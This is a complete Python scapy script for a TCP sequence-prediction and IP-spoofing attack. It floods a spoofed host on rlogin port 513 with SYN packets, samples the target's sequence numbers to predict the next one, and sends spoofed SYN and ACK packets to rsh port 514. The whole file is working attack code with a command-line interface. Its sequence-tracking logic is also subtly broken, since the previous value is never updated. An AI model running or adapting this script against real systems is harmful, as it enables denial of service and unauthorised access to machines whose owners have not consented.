#!/usr/bin/env python3
import argparse
from scapy.all import *


def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0

    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        if ans and TCP in ans:
            seqNum = ans[TCP].seq
            diffSeq = seqNum - preNum
            print('[+] TCP Seq Difference: ' + str(diffSeq))
    return seqNum + diffSeq


def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)


def main():
    parser = argparse.ArgumentParser(description='usage %prog ' +
                                                 '-s <src for SYN Flood> -S <src for spoofed connection> ' +
                                                 '-t <target address>')
    parser.add_argument('-s', dest='synSpoof', type=str,
                        help='specify src for SYN Flood')
    parser.add_argument('-S', dest='srcSpoof', type=str,
                        help='specify src for spoofed connection')
    parser.add_argument('-t', dest='tgt', type=str,
                        help='specify target address')
    args = parser.parse_args()

    if not args.synSpoof or not args.srcSpoof or not args.tgt:
        print(parser.description)
        exit(0)

    print('[+] Starting SYN Flood to suppress remote server.')
    synFlood(args.synSpoof, args.tgt)
    print('[+] Calculating correct TCP Sequence Number.')
    seqNum = calTSN(args.tgt) + 1
    print('[+] Spoofing Connection.')
    spoofConn(args.srcSpoof, args.tgt, seqNum)
    print('[+] Done.')


if __name__ == '__main__':
    main()

